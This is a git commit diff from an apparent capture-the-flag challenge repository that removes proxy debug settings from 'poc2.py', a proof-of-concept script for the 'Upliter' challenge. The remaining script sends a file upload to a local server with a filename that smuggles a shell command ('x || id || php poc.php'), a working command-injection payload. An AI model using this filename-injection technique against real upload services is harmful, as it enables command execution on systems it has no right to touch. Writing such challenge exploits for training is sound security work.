3443c8cad6213748b7d65cb9f9a69d7b46d25f1a
cupojavajoe <59887328+cupojavajoe@users.noreply.github.com>
2023-07-30 20:56:16 -0400

    Removed proxy debug values/parameters from Upliter poc2.py

--- Challenges/Upliter/documentation/poc2.py
+++ Challenges/Upliter/documentation/poc2.py
@@ -1,13 +1,11 @@
 import requests
 
-proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
-
 port = "5000"
 url = f"http://localhost:{port}"
 
 commands = "id"
 payload = f"x || {commands} || php poc.php"
 
-r = requests.post(url, files=[("file", (payload, "anything", "application/x-php"))], proxies=proxies, verify=False)
+r = requests.post(url, files=[("file", (payload, "anything", "application/x-php"))])
 
 print(r.text)
